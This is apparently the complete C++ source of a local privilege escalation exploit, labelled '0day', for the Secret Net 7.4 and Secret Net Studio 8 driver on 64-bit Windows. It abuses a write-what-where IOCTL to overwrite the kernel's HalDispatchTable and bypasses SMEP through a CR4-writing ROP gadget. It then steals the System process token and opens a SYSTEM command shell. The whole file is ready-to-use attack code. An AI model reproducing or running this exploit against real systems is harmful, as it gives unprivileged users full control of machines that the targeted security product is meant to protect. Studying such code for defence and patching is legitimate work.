/*
    
    Secret Net 7.4 and Secret Net Studio 8 local privileges escalation exploit (0day).

    Discovered and developed by:
    Dmytro Oleksiuk
    
    mailto:cr4sh0@gmail.com
    http://blog.cr4.sh/

*/
#include "stdafx.h"

//
// Constants for vulnerable driver
//
#define EXPL_BUFF_SIZE      0x60
#define EXPL_CONTROL_CODE   0x220010
#define EXPL_DEVICE_PATH    "\\\\.\\Global\\SNCC0_Sys"

extern "C"
{
void WINAPI GetCPUIDFeatureBits(DWORD EaxValue, PDWORD EcxValue, PDWORD EdxValue, PDWORD EbxValue);
}

static PHAL_DISPATCH m_HalDispatchTable = NULL;
static func_PsLookupProcessByProcessId f_PsLookupProcessByProcessId = NULL;
static func_ExAllocatePool f_ExAllocatePool = NULL;
static DWORD m_EPROCESS_Token = 0, m_dwCurrentProcessId = 0;
static PVOID m_Rop_Mov_Cr4 = NULL;
static BOOL m_bExplOk = FALSE;
//--------------------------------------------------------------------------------------
void WINAPI _r0_proc_continue(void)
{
    if (m_HalDispatchTable && f_ExAllocatePool)
    {

#if defined(_X86_)

#define TEMP_CODE_LEN 8

        char TempCode[] =
            "\xB8\x01\x00\x00\xC0"  // mov      eax, 0xC00000001 
            "\xC2\x1C\x00";         // retn     0x1C

#elif defined(_AMD64_)            

#define TEMP_CODE_LEN 6

        char TempCode[] =
            "\xB8\x01\x00\x00\xC0"  // mov      eax, 0xC00000001 
            "\xC3";                 // retn
#endif

        // allocate dummy code to restore overwritten HalQuerySystemInformation pointer
        if (m_HalDispatchTable->HalQuerySystemInformation = f_ExAllocatePool(NonPagedPool, TEMP_CODE_LEN))
        {
            memcpy(m_HalDispatchTable->HalQuerySystemInformation, TempCode, TEMP_CODE_LEN);
        }
    }

    PVOID pCurrentProcess = NULL, pSystemProcess = NULL;
    PVOID pToken = NULL;

    NTSTATUS ns = f_PsLookupProcessByProcessId((HANDLE)m_dwCurrentProcessId, &pCurrentProcess);
    if (NT_SUCCESS(ns))
    {
        // lookup "System" process (PID = 4)
        ns = f_PsLookupProcessByProcessId((HANDLE)(4), &pSystemProcess);
        if (NT_SUCCESS(ns))
        {
            // get access token of system process
            pToken = *(PVOID *)((PUCHAR)pSystemProcess + m_EPROCESS_Token);

            // update access token of exploit process
            *(PVOID *)((PUCHAR)pCurrentProcess + m_EPROCESS_Token) = pToken;

            m_bExplOk = TRUE;
        }
    }
}
//--------------------------------------------------------------------------------------
NTSTATUS WINAPI _r0_proc_HalQuerySystemInformation(
    ULONG InformationClass,
    ULONG BufferSize,
    PVOID Buffer,
    PULONG ReturnedLength)
{
    _r0_proc_continue();

    return 0;
}
//--------------------------------------------------------------------------------------
DWORD RopGadgetFind(PVOID Buffer, DWORD dwSize, char *Sign, DWORD dwSignSize)
{
    for (DWORD i = 0; i < dwSize - dwSignSize; i += 1)
    {
        BOOL Matched = TRUE;
        for (DWORD n = 0; n < dwSignSize; n += 1)
        {
            if (*((PUCHAR)Buffer + i + n) != (UCHAR)Sign[n])
            {
                Matched = FALSE;
                break;
            }
        }

        if (Matched) return i;
    }

    return 0;
}

BOOL RopGadgetInit(void)
{
    BOOL bRet = FALSE;

    PRTL_PROCESS_MODULES Info = (PRTL_PROCESS_MODULES)GetSysInf(SystemModuleInformation);
    if (Info)
    {
        // get kernel address and file name
        PVOID KernelBase = Info->Modules[0].ImageBase;
        char *lpszKernelName = (char *)Info->Modules[0].FullPathName + Info->Modules[0].OffsetToFileName;

        // load kernel image as dynamic library
        HMODULE hModule = LoadLibraryExA(lpszKernelName, 0, DONT_RESOLVE_DLL_REFERENCES);
        if (hModule)
        {
            PIMAGE_NT_HEADERS pHeaders = (PIMAGE_NT_HEADERS)
                RVATOVA(hModule, ((PIMAGE_DOS_HEADER)hModule)->e_lfanew);

            PIMAGE_SECTION_HEADER pSection = (PIMAGE_SECTION_HEADER)
                RVATOVA(&pHeaders->OptionalHeader, pHeaders->FileHeader.SizeOfOptionalHeader);            

            // enumerate kernel image sections        
            for (DWORD i = 0; i < pHeaders->FileHeader.NumberOfSections; i++)
            {                        
                // check for usable code section
                if ((pSection->Characteristics & IMAGE_SCN_MEM_EXECUTE) &&
                    !(pSection->Characteristics & IMAGE_SCN_MEM_DISCARDABLE))
                {
                    /*
                        ROP gadgets search.
                    */
                    PUCHAR pData = (PUCHAR)RVATOVA(hModule, pSection->VirtualAddress);
                    DWORD dwDataSize = pSection->Misc.VirtualSize, dwRva = 0;

                    #define ROP_FIND(_var_, _sign_, _len_)                                          \
                                                                                                    \
                        if ((dwRva = RopGadgetFind(pData, dwDataSize, (_sign_), (_len_))) > 0)      \
                        {                                                                           \
                            (_var_) = RVATOVA(KernelBase, pSection->VirtualAddress + dwRva);        \
                        }

                    if (m_Rop_Mov_Cr4 == NULL)
                    {
#ifdef _AMD64_
                        /*
                            mov     cr4, rax
                            add     rsp, 0x28
                            ret
                        */
                        ROP_FIND(m_Rop_Mov_Cr4, "\x0f\x22\xe0\x48\x83\xc4\x28\xc3", 8);
#else

#error amd64 only

#endif
                    }

                    if (m_Rop_Mov_Cr4)
                    {
                        // all gadgets was found
                        break;
                    }
                }

                pSection += 1;
            }

            if (m_Rop_Mov_Cr4)
            {
                DbgMsg(__FILE__, __LINE__, "MOV CR4 gadget is at "IFMT"\n", m_Rop_Mov_Cr4);

                bRet = TRUE;
            }
            else
            {
                DbgMsg(__FILE__, __LINE__, __FUNCTION__"() ERROR: Unable to find required ROP gadgets\n");
            }

            FreeLibrary(hModule);
        }
        else
        {
            DbgMsg(__FILE__, __LINE__, "LoadLibraryEx() ERROR %d\n", GetLastError());
        }

        M_FREE(Info);
    }

    return bRet;
}
//--------------------------------------------------------------------------------------
int _tmain(int argc, _TCHAR* argv[])
{
    m_dwCurrentProcessId = GetCurrentProcessId();

    printf("*********************************************************************\n\n");
    printf("  Secret Net / Secret Net Studio local privileges escalation exploit\n");
    printf("  by Dmytro Oleksiuk ~ http://blog.cr4.sh\n\n");
    printf("*********************************************************************\n");
    
    BOOL bUseRop = FALSE;
    OSVERSIONINFOA Version;    
    Version.dwOSVersionInfoSize = sizeof(OSVERSIONINFOA); 

    // get NT verson information
    if (GetVersionExA(&Version))
    {		    
        if (Version.dwPlatformId == VER_PLATFORM_WIN32_NT)
        {

#ifdef _AMD64_

            if (Version.dwMajorVersion == 5 && Version.dwMinorVersion == 2)
            {
                // Windows XP / Server 2003
                m_EPROCESS_Token = 0x0160;
            }
            else if (Version.dwMajorVersion == 6 && Version.dwMinorVersion == 0)
            {
                // Windows Vista / Server 2008
                m_EPROCESS_Token = 0x0168;
            }
            else if (Version.dwMajorVersion == 6 && Version.dwMinorVersion == 1)
            {
                // Windows 7 / Server 2008 R2
                m_EPROCESS_Token = 0x0208;
            }
            else if (Version.dwMajorVersion == 6 && Version.dwMinorVersion == 2)
            {
                // Windows 8 / Server 2012
                m_EPROCESS_Token = 0x0348;
            }
            else if (Version.dwMajorVersion == 6 && Version.dwMinorVersion == 3)
            {
                // Windows 8.1 / Server 2012 R2
                m_EPROCESS_Token = 0x0348;
            }
            else if (Version.dwMajorVersion == 10 && Version.dwMinorVersion == 0)
            {
                // Windows 10 / Server 2016
                m_EPROCESS_Token = 0x0358;
            }
            else
#else

#error amd64 only

#endif
            {
                DbgMsg(
                    __FILE__, __LINE__, "ERROR: Unknown NT version %d.%d.%d\n", 
                    Version.dwMajorVersion, Version.dwMinorVersion, Version.dwBuildNumber
                );

                goto end;
            }      

            DbgMsg(
                __FILE__, __LINE__, "NT version is %d.%d.%d\n",
                Version.dwMajorVersion, Version.dwMinorVersion, Version.dwBuildNumber
            );

            /*
                Determinate if we need to use ROP to bypass SMEP.
            */
            if ((Version.dwMajorVersion == 6 && Version.dwMinorVersion == 2) ||
                (Version.dwMajorVersion == 6 && Version.dwMinorVersion == 3) ||
                (Version.dwMajorVersion == 10 && Version.dwMinorVersion == 0))
            {
                bUseRop = TRUE;
            }
        }
        else
        {
            DbgMsg(__FILE__, __LINE__, "ERROR: Unknown platform ID\n");
            goto end;
        }
    }
    else
    {
        DbgMsg(__FILE__, __LINE__, "GetVersionEx() ERROR %d\n", GetLastError());
        goto end;    
    }

    DbgMsg(__FILE__, __LINE__, "_EPROCESS::Token offset is 0x%.4x\n", m_EPROCESS_Token);

    // get real address of nt!HalDispatchTable
    m_HalDispatchTable = (PHAL_DISPATCH)KernelGetProcAddr("HalDispatchTable");
    if (m_HalDispatchTable == NULL)
    {
        DbgMsg(__FILE__, __LINE__, "ERROR: Can't lookup address of nt!HalDispatchTable\n");
        goto end;
    }

    // get real address of nt!ExAllocatePool()
    f_ExAllocatePool = (func_ExAllocatePool)KernelGetProcAddr("ExAllocatePool");
    if (f_ExAllocatePool == NULL)
    {
        DbgMsg(__FILE__, __LINE__, "ERROR: Can't lookup address of nt!ExAllocatePool()\n");
        goto end;
    }

    // get real address of nt!PsLookupProcessByProcessId()
    f_PsLookupProcessByProcessId = (func_PsLookupProcessByProcessId)KernelGetProcAddr("PsLookupProcessByProcessId");
    if (f_PsLookupProcessByProcessId == NULL)
    {
        DbgMsg(__FILE__, __LINE__, "ERROR: Can't lookup address of nt!PsLookupProcessByProcessId()\n");
        goto end;
    }        

    DbgMsg(__FILE__, __LINE__, "nt!HalDispatchTable is at "IFMT"\n", m_HalDispatchTable);
    DbgMsg(__FILE__, __LINE__, "nt!ExAllocatePool() is at "IFMT"\n", f_ExAllocatePool);
    DbgMsg(__FILE__, __LINE__, "nt!PsLookupProcessByProcessId() is at "IFMT"\n", f_PsLookupProcessByProcessId);    

    LARGE_INTEGER Val;
    PVOID Trampoline = NULL;

    if (bUseRop)
    {
        if (!RopGadgetInit())
        {
            goto end;
        }

        Val.QuadPart = (DWORD64)m_Rop_Mov_Cr4;

        /*
            Because of ROP limitation we need to allocate shellcode trampoline
            below 4GB of virtual memory space.
        */
        DWORD_PTR Addr = PAGE_SIZE;

        while (true)
        {
            if (Trampoline = VirtualAlloc((PVOID)Addr, PAGE_SIZE, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE))
            {
                DbgMsg(__FILE__, __LINE__, "Shellcode trampoline is allocated at "IFMT"\n", Trampoline);
                break;
            }
            else if (Addr >= 0x7fff0000)
            {
                // unable to allocate memory
                goto end;
            }
            else
            {
                // try next address
                Addr += PAGE_SIZE;
            }
        }

        // MOV RAX, _r0_proc_continue
        *(PWORD)((DWORD_PTR)Trampoline) = 0xb848;
        *(PDWORD_PTR)((DWORD_PTR)Trampoline + 0x02) = (DWORD_PTR)&_r0_proc_continue;

        // CALL RAX ; calls _r0_proc_continue()
        *(PWORD)((DWORD_PTR)Trampoline + 0x0a) = 0xd0ff;

        // ADD RSP, 20h ; restore proper stack pointer value
        *(PDWORD)((DWORD_PTR)Trampoline + 0x0c) = 0x20c48348;

        // RET ; return back to the nt!NtQueryntervalProfile()
        *(PUCHAR)((DWORD_PTR)Trampoline + 0x10) = 0xc3;
    }
    else
    {
        Val.QuadPart = (DWORD64)&_r0_proc_HalQuerySystemInformation;
    }

    DbgMsg(__FILE__, __LINE__, "Opengin device \"%s\"...\n", EXPL_DEVICE_PATH);

    // get handle to the target device
    HANDLE hDev = CreateFile(_T(EXPL_DEVICE_PATH), GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (hDev == INVALID_HANDLE_VALUE)
    {
        DbgMsg(__FILE__, __LINE__, "CreateFile() ERROR %d\n", GetLastError());
        goto end;
    }

    IO_STATUS_BLOCK StatusBlock;
    DWORD ns = 0, dwCode = EXPL_CONTROL_CODE;    

    UCHAR Buff[EXPL_BUFF_SIZE];
    ZeroMemory(Buff, sizeof(Buff));    

    GET_NATIVE(NtDeviceIoControlFile);
    GET_NATIVE(NtQueryIntervalProfile);
    GET_NATIVE(NtQuerySystemInformation);      

    #define SEND_IOCTL(_code_, _ib_, _il_, _ob_, _ol_)          \
                                                                \
        ns = f_NtDeviceIoControlFile(                           \
            hDev, NULL, NULL, NULL, &StatusBlock, (_code_),     \
            (PVOID)(_ib_), (DWORD)(_il_),                       \
            (PVOID)(_ob_), (DWORD)(_ol_)                        \
        );                                                      \
                                                                \
        DbgMsg(                                                 \
            __FILE__, __LINE__,                                 \
            "IOCTL 0x%.8x: status = 0x%.8x, info = 0x%.8x\n",   \
            (_code_), ns, StatusBlock.Information               \
        );

    DbgMsg(__FILE__, __LINE__, "Buff = "IFMT"\n", &Buff);

#ifdef _AMD64_

    /*
        Fill IOCTL Input buffer with additional parameters values:

            where = *(_QWORD *)Buff
            what = *(_DWORD *)(Buff + 0x58)
            trash = *(_DWORD *)(Buff + 0x5C)
            a4 = (const void *)(Buff + 0x60)

            ...

            *(_DWORD *)(where + 0x18) = what;
            **(_DWORD **)(where + 0x10) = trash;
            if (!what && trash <= *(_DWORD *)where)
              qmemcpy(*(void **)(where + 8), a4, trash);
            KeSetEvent((PRKEVENT)(where + 32), 0, 0);

            ...

            kd> dps nt!HalDispatchTable-8
            fffff800`01a3fca8  00000001`ffffffff
            fffff800`01a3fcb0  00000000`00000004
            fffff800`01a3fcb8  fffff800`0183d8e8 hal!HaliQuerySystemInformation
            fffff800`01a3fcc0  fffff800`0183e470 hal!HalpSetSystemInformation
            fffff800`01a3fcc8  fffff800`01c3e5e0 nt!xHalStartMirroring
            fffff800`01a3fcd0  00000000`00000000
            fffff800`01a3fcd8  fffff800`0190a170 nt!HalExamineMBR
            fffff800`01a3fce0  fffff800`01be3b50 nt!IoReadPartitionTable

    */    
    *(PDWORD64)&Buff[0x00] = (DWORD64)m_HalDispatchTable - 0x10;
    *(PDWORD)&Buff[0x58] = Val.LowPart;
    *(PDWORD)&Buff[0x5c] = 0;        

    /*
        Call vulnreable driver and modify HAL_DISPATCH::HalQuerySystemInformation
    */
    ns = SEND_IOCTL(dwCode, (PVOID)&Buff, sizeof(Buff), (PVOID)&Buff, sizeof(Buff));
    
    DbgMsg(
        __FILE__, __LINE__, "IOCTL 0x%.8x: status = 0x%.8x, info = 0x%.8x\n", 
        dwCode, ns, StatusBlock.Information
    );

    *(PDWORD64)&Buff[0x00] += sizeof(DWORD);
    *(PDWORD)&Buff[0x58] = Val.HighPart;

    ns = SEND_IOCTL(dwCode, (PVOID)&Buff, sizeof(Buff), (PVOID)&Buff, sizeof(Buff));
    
    DbgMsg(
        __FILE__, __LINE__, "IOCTL 0x%.8x: status = 0x%.8x, info = 0x%.8x\n", 
        dwCode, ns, StatusBlock.Information
    );

#else

#error amd64 only

#endif    
    
    if (bUseRop)
    {
        /*
            Use SMEP bypass.
        */
        DWORD FeaturesEcx = 0, FeaturesEdx = 0, FeaturesEbx = 0;
        DWORD ExtFeaturesEcx = 0, ExtFeaturesEdx = 0, ExtFeaturesEbx = 0;

        // get features bits and extended features bits
        GetCPUIDFeatureBits(0x00000001, &FeaturesEcx, &FeaturesEdx, &FeaturesEbx);
        GetCPUIDFeatureBits(0x00000007, &ExtFeaturesEcx, &ExtFeaturesEdx, &ExtFeaturesEbx);

        DbgMsg(
            __FILE__, __LINE__, "CPUID: EAX = 0x00000001, EDX = 0x%.8x, ECX = 0x%.8x\n", 
            FeaturesEdx, FeaturesEcx
        );
        
        DbgMsg(
            __FILE__, __LINE__, "CPUID: EAX = 0x00000007, EBX = 0x%.8x, ECX = 0x%.8x\n", 
            ExtFeaturesEbx, ExtFeaturesEcx
        );

        DWORD InfoSize = 0;
        SYSTEM_PROCESSOR_INFORMATION ProcessorInfo;
        ProcessorInfo.ProcessorFeatureBits = 0;

        NTSTATUS ns = f_NtQuerySystemInformation(
            SystemProcessorInformation, &ProcessorInfo, sizeof(ProcessorInfo), &InfoSize);

        if (NT_SUCCESS(ns))
        {
            DbgMsg(__FILE__, __LINE__, "ProcessorFeatureBits is 0x%.8x\n", ProcessorInfo.ProcessorFeatureBits);
        }

        /*
            Calculate actual CR4 register value for current machine using hardware information.

            CR4 register bits explanation:

            21 SMAP - Supervisor Mode Access Protection Enable
            If set, access of data in a higher ring generates a fault[1]

            20 SMEP - Supervisor Mode Execution Protection Enable
            If set, execution of code in a higher ring generates a fault

            18 OSXSAVE - XSAVE and Processor Extended States Enable

            17 PCIDE - PCID Enable
            If set, enables process-context identifiers (PCIDs).

            14 SMXE - Safer Mode Extensions Enable, see Trusted Execution Technology (TXT)
            13 VMXE - Virtual Machine Extensions Enable, see Intel VT-x

            10 OSXMMEXCPT - Operating System Support for Unmasked SIMD Floating-Point Exceptions
            If set, enables unmasked SSE exceptions.

            x 9 OSFXSR - Operating system    support for FXSAVE and FXRSTOR instructions
            If set, enables SSE instructions and fast FPU save & restore.

            8 PCE - Performance-Monitoring Counter enable
            If set, RDPMC can be executed at any privilege level, else RDPMC can only be used in ring 0.

            7 PGE - Page Global Enabled
            If set, address translations (PDE or PTE records) may be shared between address spaces.

            6 MCE - Machine Check Exception
            If set, enables machine check interrupts to occur.

            5 PAE - Physical Address Extension
            If set, changes page table layout to translate 32-bit virtual addresses into extended 36-bit physical addresses.

            4 PSE - Page Size Extension
            If unset, page size is 4 KiB, else page size is increased to 4 MiB (or 2 MiB with PAE set).

            3 DE - Debugging Extensions
            If set, enables debug register based breaks on I/O space access.

            2 TSD - Time Stamp Disable
            If set, RDTSC instruction can only be executed when in ring 0, otherwise RDTSC can be used at any privilege level.

            1 PVI - Protected-mode Virtual Interrupts
            If set, enables support for the virtual interrupt flag (VIF) in protected mode.

            0 VME - Virtual 8086 Mode Extensions
            If set, enables support for the virtual interrupt flag (VIF) in virtual-8086 mode.
        */
        DWORD Cr4Value = CR4_VME | CR4_DE | CR4_PAE | CR4_MCE | CR4_FXSR | CR4_XMMEXCPT;

        if (FeaturesEcx & CPUID_OSXSAVE)
        {
            // XSAVE and processor extended states - enable bit
            Cr4Value |= CR4_OSXSAVE;
        }

        if (FeaturesEcx & CPUID_VMX)
        {
            // Virtual Machine eXtensions are supported
            Cr4Value |= CR4_VMXE;
        }

        if (ExtFeaturesEbx & CPUID_FSGSBASE)
        {
            // RDFSBASE/RDGSBASE/etc. instructions are supported
            Cr4Value |= CR4_FSGSBASE;
        }

        if (ProcessorInfo.ProcessorFeatureBits & KF_LARGE_PAGE)
        {
            // Page Size Extensions are supported
            Cr4Value |= CR4_PSE;
        }

        if (ProcessorInfo.ProcessorFeatureBits & KF_GLOBAL_PAGE)
        {
            // Page Global Enabled
            Cr4Value |= CR4_PGE;
        }

        DbgMsg(__FILE__, __LINE__, "New CR4 value is 0x%.8x\n", Cr4Value);

        /*
            NtQueryIntervalProfile() calls nt!KeQueryIntervalProfile(),
            that calls our patched HalQuerySystemInformation pointer.
        */
        DWORD_PTR Source = (DWORD_PTR)Trampoline;
        f_NtQueryIntervalProfile(Source, &Cr4Value);
    }
    else
    {
        /*
            Don't use SMEP bypass for legacy systems.
        */
        DWORD Interval = 0;
        
        f_NtQueryIntervalProfile(ProfileTotalIssues, &Interval);
    }    

end:

    if (Trampoline)
    {
        VirtualFree(Trampoline, 0, MEM_RELEASE);
    }

    if (hDev)
    {
        CloseHandle(hDev);
    }    

    if (m_bExplOk)
    {
        STARTUPINFOA si;
        PROCESS_INFORMATION pi;

        ZeroMemory(&pi, sizeof(pi));
        ZeroMemory(&si, sizeof(si));
        si.cb = sizeof(si);

        DbgMsg(__FILE__, __LINE__, "Successfully exploited, starting command shell...\n\n");

        // run cmd.exe with LocalSystem access rights        
        if (CreateProcessA(0, "cmd.exe", 0, 0, TRUE, 0, 0, 0, &si, &pi))
        {
            WaitForSingleObject(pi.hProcess, INFINITE);

            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
        else
        {
            DbgMsg(__FILE__, __LINE__, "CreateProcess() ERROR %d\n", GetLastError());
        }

        ExitProcess(0);
    }    

    printf("\nPress any key to quit...\n");
    _getch();

    return 0;
}
//--------------------------------------------------------------------------------------
// EoF
